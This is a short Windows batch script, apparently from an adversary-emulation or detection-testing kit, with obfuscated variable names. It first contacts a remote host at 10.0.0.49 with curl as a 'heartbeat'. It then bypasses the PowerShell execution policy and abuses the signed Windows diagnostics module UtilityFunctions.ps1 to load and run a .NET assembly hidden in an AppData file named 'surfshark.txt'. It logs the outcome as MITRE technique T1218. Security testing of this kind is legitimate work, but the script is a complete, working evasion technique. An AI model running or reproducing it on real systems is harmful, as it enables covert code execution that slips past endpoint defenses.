@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET xvwcbz=%APPDATA%\9302\837e8ce9
SET fdqgr=https://10.0.0.49
SET gznjdm=https://10.0.0.49/stage/2/icon.png?9302-10
SET gpmqjt=ITZEL-S2B
SET shfpm=10
SET qcnrx=surfshark.txt
SET rpdpsx=9302
SET ltvj=%APPDATA%\%shfpm%
SET yxpmk=%ltvj%\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][%gpmqjt%]: heartbeat_start>> "%yxpmk%" 2>nul
curl -k -s -o nul "%gznjdm%"
echo [%DATE% %TIME%][DEBUG][%gpmqjt%]: heartbeat_complete>> "%yxpmk%" 2>nul

SET dplhn=1
SET frsj=
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin %xvwcbz%\\%qcnrx%;[Program.Class]::Dale()"
IF ERRORLEVEL 1 SET dplhn=0&SET frsj=assembly_load_failed
echo [%DATE% %TIME%][DEBUG][%gpmqjt%]: assembly_execute=%dplhn%>> "%yxpmk%" 2>nul

SET qnwhj=T1218
SET sdwrf=Signed Binary Proxy Execution
echo [%DATE% %TIME%][%gpmqjt%]: %shfpm%-%rpdpsx%-%qnwhj%|%sdwrf%=%dplhn%:%frsj%>> "%yxpmk%" 2>nul
ENDLOCAL